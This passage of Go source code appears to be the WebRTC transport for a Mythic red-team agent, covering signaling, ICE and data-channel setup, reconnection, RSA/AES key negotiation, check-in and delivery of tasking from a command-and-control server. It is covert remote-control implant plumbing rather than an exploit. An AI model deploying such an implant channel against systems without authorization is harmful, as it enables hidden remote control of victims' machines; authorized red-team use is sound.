	select {
	case sdp := <-sdpChan:
		// Set the remote description
		err = c.PeerConnection.SetRemoteDescription(sdp)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to set remote description: %v", err))
			return false
		}

		utils.PrintDebug("Set remote description successfully")

	case <-time.After(10 * time.Second):
		utils.PrintDebug("Timeout waiting for SDP answer")
		return false
	}

	// Process ICE candidates for a while
	candidatesProcessed := 0
	timeout := time.After(15 * time.Second)

	// Wait for connection establishment or timeout
	for {
		select {
		case candidate := <-candidateChan:
			// Add the ICE candidate
			if c.PeerConnection != nil {
				err = c.PeerConnection.AddICECandidate(candidate)
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("Failed to add ICE candidate: %v", err))
				} else {
					candidatesProcessed++
					utils.PrintDebug(fmt.Sprintf("Added ICE candidate (%d)", candidatesProcessed))
				}
			} else {
				utils.PrintDebug("PeerConnection is nil, can't add ICE candidate")
			}

		case success := <-doneChan:
			// Connection is established or failed
			return success

		case <-timeout:
			// Timeout reached, but we may have enough candidates
			if candidatesProcessed > 0 {
				utils.PrintDebug("Timeout waiting for more ICE candidates, but proceeding")

				dataChannelReady := false
				for waitTime := 0; waitTime < 10; waitTime++ {
					c.Lock.RLock()
					if c.DataChannel != nil && c.DataChannel.ReadyState() == webrtc.DataChannelStateOpen {
						dataChannelReady = true
						c.Lock.RUnlock()
						break
					}
					c.Lock.RUnlock()

					utils.PrintDebug(fmt.Sprintf("Waiting for data channel to be ready (%d/10)...", waitTime+1))
					time.Sleep(1 * time.Second)
				}

				if dataChannelReady {
					utils.PrintDebug("Data channel ready, sending 'connected' message to server")
				} else {
					utils.PrintDebug("Timeout waiting for data channel to be ready, but proceeding anyway")
				}

				// Send a 'connected' message to the server
				connectedMsg := SignalMessage{
					Type:        "connected",
					Destination: "answer",
					AuthKey:     c.AuthKey,
					AgentUUID:   GetMythicID(),
				}

				if c.SignalingConn != nil {
					err := c.SignalingConn.WriteJSON(connectedMsg)
					if err != nil {
						utils.PrintDebug(fmt.Sprintf("Failed to send connected message: %v", err))
					} else {
						utils.PrintDebug("Sent 'connected' message to server")
					}

					// Give the server a moment to process the message
					time.Sleep(500 * time.Millisecond)
				}

				return true
			}

			utils.PrintDebug("Timeout waiting for ICE candidates")
			return false
		}
	}
}

// startDataChannelListener handles incoming messages in Push mode
func (c *C2WebRTC) startDataChannelListener() {
	defer func() {
		c.stoppedChannel <- true
	}()

	// Wait for data channel to be established
	for {
		c.Lock.RLock()
		dataChannel := c.DataChannel
		dataChannelReady := dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen
		c.Lock.RUnlock()

		if dataChannelReady {
			utils.PrintDebug("Data channel is ready for push mode")
			break
		}

		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			return
		}

		utils.PrintDebug("Waiting for data channel to be ready for push mode...")
		time.Sleep(500 * time.Millisecond)
	}

	// Now we have a data channel, proceed with checkin
	utils.PrintDebug("Data channel established, proceeding with push mode")

	// If we're exchanging keys, start the key exchange
	if c.ExchangingKeys {
		c.NegotiateKey()
	} else {
		c.CheckIn()
	}

	// Send a message to get any pending tasks
	missedMessages := responses.CreateMythicPollMessage()
	raw, err := json.Marshal(missedMessages)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error marshaling poll message: %v", err))
	} else {
		c.SendMessage(raw)
	}

	// Main loop - just keep the agent running
	// The actual message handling is done by the DataChannel.OnMessage callback
	for {
		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
			c.closeConnections()
			return
		}

		// Check if the data channel is still open
		c.Lock.RLock()
		dataChannel := c.DataChannel
		c.Lock.RUnlock()

		if dataChannel == nil || dataChannel.ReadyState() != webrtc.DataChannelStateOpen {
			utils.PrintDebug("Data channel closed, reconnecting")
			go c.reconnect()
			return
		}

		// Sleep for a bit to avoid busy waiting
		time.Sleep(1 * time.Second)
	}
}

func (c *C2WebRTC) reconnect() {
	if c.ShouldStop {
		utils.PrintDebug("Got c.ShouldStop in reconnect")
		return
	}

	c.ReconnectLock.Lock()
	defer c.ReconnectLock.Unlock()

	// Close existing connections
	if c.SignalingConn != nil {
		c.SignalingConn.Close()
		c.SignalingConn = nil
	}

	if c.PeerConnection != nil {
		c.PeerConnection.Close()
		c.PeerConnection = nil
	}

	c.Lock.Lock()
	c.DataChannel = nil
	c.Lock.Unlock()

	utils.PrintDebug("Reconnecting to signaling server")

	// Try to reconnect
	for i := 0; i < 5; i++ {
		if c.ShouldStop {
			return
		}

		// Connect to signaling server
		if !c.connectSignaling() {
			utils.PrintDebug("Failed to connect to signaling server, retrying")
			time.Sleep(time.Duration(2*(i+1)) * time.Second)
			continue
		}

		// Create a WebRTC connection
		if !c.setupWebRTC() {
			utils.PrintDebug("Failed to set up WebRTC, retrying")
			time.Sleep(time.Duration(2*(i+1)) * time.Second)
			continue
		}

		// Exchange SDP information
		if !c.exchangeSDP() {
			utils.PrintDebug("Failed to exchange SDP, retrying")
			time.Sleep(time.Duration(2*(i+1)) * time.Second)
			continue
		}

		utils.PrintDebug("Reconnected successfully")

		// If we're in Push mode, re-register with the server
		if c.TaskingType == TaskingTypePush {
			// Wait for the data channel to be ready
			for {
				c.Lock.RLock()
				dataChannel := c.DataChannel
				c.Lock.RUnlock()

				if dataChannel != nil {
					break
				}
				if c.ShouldStop {
					return
				}
				time.Sleep(100 * time.Millisecond)
			}

			// Send agent information
			agentInfo := SignalMessage{
				Type:      "agent_info",
				AgentUUID: GetMythicID(),
				AuthKey:   c.AuthKey,
			}

			agentInfoBytes, _ := json.Marshal(agentInfo)
			c.DataChannel.Send(agentInfoBytes)

			// If we're exchanging keys, start the key exchange
			if c.ExchangingKeys {
				c.NegotiateKey()
			} else {
				c.CheckIn()
			}
		}

		return
	}

	utils.PrintDebug("Failed to reconnect after multiple attempts")
}

func (c *C2WebRTC) closeConnections() {
	if c.SignalingConn != nil {
		c.SignalingConn.Close()
		c.SignalingConn = nil
	}

	if c.PeerConnection != nil {
		c.PeerConnection.Close()
		c.PeerConnection = nil
	}

	c.Lock.Lock()
	c.DataChannel = nil
	c.Lock.Unlock()
}

func (c *C2WebRTC) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2WebRTC) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}

func (c *C2WebRTC) SetEncryptionKey(newKey string) {
	c.Key = newKey
	c.ExchangingKeys = false
}

func (c *C2WebRTC) FinishNegotiateKey(resp []byte) bool {
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err := json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling eke response: %s\n", err.Error()))
		return false
	}

	if len(sessionKeyResp.UUID) > 0 {
		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
	} else {
		utils.PrintDebug("No UUID received in FinishNegotiateKey response")
		return false
	}

	// Decode the encrypted session key
	encryptedSessionKey, err := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error decoding session key: %s", err.Error()))
		return false
	}

	// Decrypt the session key using our RSA private key
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSessionKey, c.RsaPrivateKey)
	if len(decryptedKey) == 0 {
		utils.PrintDebug("Failed to decrypt session key")
		return false
	}

	// Save the new AES session key
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey)
	c.ExchangingKeys = false
	c.FinishedStaging = true
	SetAllEncryptionKeys(c.Key)

	utils.PrintDebug("Successfully finished key negotiation")
	return true
}

func (c *C2WebRTC) processMessage(data []byte) {
	utils.PrintDebug(fmt.Sprintf("processMessage - Received data of length: %d", len(data)))

	var messageWrapper Message
	err := json.Unmarshal(data, &messageWrapper)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error unmarshaling message: %v", err))
		return
	}

	// Decode the base64 data
	decodedData, err := base64.StdEncoding.DecodeString(messageWrapper.Data)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error decoding base64 data: %v", err))
		return
	}

	// Remove the UUID (first 36 bytes)
	if len(decodedData) < 36 {
		utils.PrintDebug("Message data too short")
		return
	}

	// Extract and decrypt the payload
	payload := decodedData[36:]
	if len(c.Key) != 0 {
		payload = c.decryptMessage(payload)
		if len(payload) == 0 {
			utils.PrintDebug("Failed to decrypt message")
			return
		}
	}

	utils.PrintDebug(fmt.Sprintf("processMessage - Decrypted payload length: %d", len(payload)))

	// If we're waiting for a response to sendAndReceiveMessage, send it there
	c.responseMutex.RLock()
	waiting := c.waitingForResponse
	respChan := c.responseChannel
	c.responseMutex.RUnlock()

	utils.PrintDebug(fmt.Sprintf("processMessage - waitingForResponse: %v, responseChannel exists: %v", waiting, respChan != nil))

	if waiting && respChan != nil {
		utils.PrintDebug("processMessage - Sending to response channel")
		select {
		case respChan <- payload:
			utils.PrintDebug("processMessage - Successfully sent response to waiting channel")
		default:
			utils.PrintDebug("processMessage - Response channel full, processing normally")
			c.handleNormalMessage(payload)
		}
		return
	}

	utils.PrintDebug("processMessage - Processing as normal message")
	// Handle normal message processing (like in websocket client)
	c.handleNormalMessage(payload)
}

func (c *C2WebRTC) handleNormalMessage(payload []byte) {
	// Handle like the websocket client does in getData()
	if c.FinishedStaging {
		taskResp := structs.MythicMessageResponse{}
		err := json.Unmarshal(payload, &taskResp)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to unmarshal message into MythicResponse: %v", err))
			return
		}
		responses.HandleInboundMythicMessageFromEgressChannel <- taskResp
	} else {
		if c.ExchangingKeys {
			// Handle key exchange response
			if c.FinishNegotiateKey(payload) {
				c.CheckIn()
			} else {
				c.NegotiateKey()
			}
		} else {
			// Handle checkin response
			checkinResp := structs.CheckInMessageResponse{}
			err := json.Unmarshal(payload, &checkinResp)
			if err != nil {
				utils.PrintDebug(fmt.Sprintf("handleNormalMessage - Error unmarshaling checkin response: %v", err))
				return
			}

			if checkinResp.Status == "success" {
				SetMythicID(checkinResp.ID)
				c.FinishedStaging = true
				c.ExchangingKeys = false
			} else {
				utils.PrintDebug(fmt.Sprintf("Failed to checkin, got: %s", string(payload)))
			}
		}
	}
}
